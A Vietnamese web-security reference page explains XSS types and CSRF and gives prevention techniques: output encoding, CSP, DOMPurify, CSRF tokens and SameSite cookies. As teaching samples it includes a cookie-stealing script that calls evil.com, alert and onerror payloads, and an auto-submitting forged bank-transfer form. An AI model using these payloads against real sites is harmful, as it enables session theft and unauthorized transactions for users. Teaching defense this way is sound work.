---
title: XSS & CSRF
description: "XSS (Cross-Site Scripting) và CSRF (Cross-Site Request Forgery) — hai loại tấn công web phổ biến nhất, cách phòng tránh và best practices"
tags: [xss, csrf, cross-site-scripting, cross-site-request-forgery, web-security, vulnerability]
category: developer
updated: 2026-07-26
order: 18
---

# XSS & CSRF

XSS inject script vào trang web. CSRF trick user thực hiện action không mong muốn. Cả hai đều OWASP Top 10.

---

## XSS Types

```text
┌───────────────────────────────────────────────────────────┐
│                    XSS TYPES                              │
│                                                           │
│  1. Stored XSS (Permanent)                                │
│     Attacker lưu script vào DB → victims load → chạy      │
│                                                           │
│  2. Reflected XSS (Non-Persistent)                        │
│     Script trong URL → server reflect → chạy              │
│                                                           │
│  3. DOM-based XSS                                         │
│     Vulnerable trong client JS → không qua server         │
│                                                           │
└───────────────────────────────────────────────────────────┘
```

### Attack Flow

```text
Stored XSS:
  Attacker submit comment: <script>fetch('evil.com/steal?c='+document.cookie)</script>
  → Saved to DB → Victim views page → Script runs → Cookie stolen

Reflected XSS:
  Link: https://example.com/search?q=<script>alert(1)</script>
  → Server reflects in response → Script runs

DOM-based XSS:
  location.hash → innerHTML (no server involved)
```

### DOM-based XSS Example

```javascript
// VULNERABLE
const name = location.hash.substring(1);
document.getElementById('output').innerHTML = name;
// Attack: https://example.com/page#<img src=x onerror=alert('XSS')>
```

---

## CSRF Flow

```text
1. Victim login bank.com (cookie set)

2. Victim visits evil.com:
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>

3. Browser sends request WITH victim's cookies
   → Transfer executes
```

---

## XSS vs CSRF

| Tính năng | XSS | CSRF |
|-----------|-----|------|
| Target | Victim's browser | Victim's session |
| Input | Malicious script | Forged request |
| Cookie | Stolen via JS | Auto-sent by browser |
| SameSite | Không phòng được | **Phòng được** |
| CSP | **Phòng được** | Không phòng được |
| CSRF Token | Không cần | **Cần** |

---

## Prevention

### XSS Prevention

| # | Kỹ thuật | Priority |
|---|----------|---------|
| 1 | **Output Encoding** — encode `<`, `>`, `"`, `'`, `&` | Critical |
| 2 | **Content Security Policy** — restrict script sources | High |
| 3 | **DOMPurify** — sanitize HTML | High |
| 4 | **HttpOnly Cookie** — không JS access | High |
| 5 | **Trusted Types** — DOM XSS prevention API | Medium |
| 6 | **Input Validation** — whitelist characters | Medium |

```javascript
// DOMPurify
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);

// Output encoding
function escapeHtml(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;');
}
```

### CSRF Prevention

| # | Kỹ thuật | Priority |
|---|----------|---------|
| 1 | **CSRF Token** — random token in form, verify server-side | Critical |
| 2 | **SameSite Cookie** — `Strict` hoặc `Lax` | High |
| 3 | **Custom Headers** — JS-set headers (XHR/fetch) | Medium |
| 4 | **Origin/Referer Check** — verify request origin | Medium |
| 5 | **Double Submit Cookie** — token trong cookie + header | Medium |

```javascript
// CSRF token in form
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="abc123xyz">
</form>

// Server verify
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken)
    return res.status(403).send('Invalid CSRF token');
});

// SameSite cookie
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

---

## Prevention Checklist

| # | Check | XSS | CSRF |
|---|-------|-----|------|
| 1 | Output encode all user input | ✅ | |
| 2 | Enable CSP | ✅ | |
| 3 | Use DOMPurify for HTML | ✅ | |
| 4 | Use CSRF tokens | | ✅ |
| 5 | Set SameSite cookies | | ✅ |
| 6 | HttpOnly cookies for session | ✅ | ✅ |
| 7 | Enable HTTPS everywhere | ✅ | ✅ |
| 8 | Set security headers | ✅ | ✅ |
| 9 | Validate and sanitize input | ✅ | |
| 10 | Keep dependencies updated | ✅ | ✅ |

---

## OWASP Top 10 (2021)

| # | Vulnerability | Liên quan |
|---|--------------|-----------|
| A01 | Broken Access Control | XSS, CSRF |
| A03 | Injection | XSS, SQL Injection |
| A05 | Security Misconfiguration | CSP, CORS |
| A06 | Vulnerable Components | Outdated libraries |
| A07 | Auth Failures | Session management |

---

## DevTools Debugging

| Issue | Where to Check |
|-------|---------------|
| XSS | Console errors, Sources tab |
| CSP violation | Console → CSP errors |
| CORS error | Network tab → CORS error |
| Mixed content | Security panel |

---

**Xem thêm:** [Browser Security](17-browser-security.md) | [Chrome DevTools](19-chrome-devtools.md) | [Web Storage](13-web-storage.md)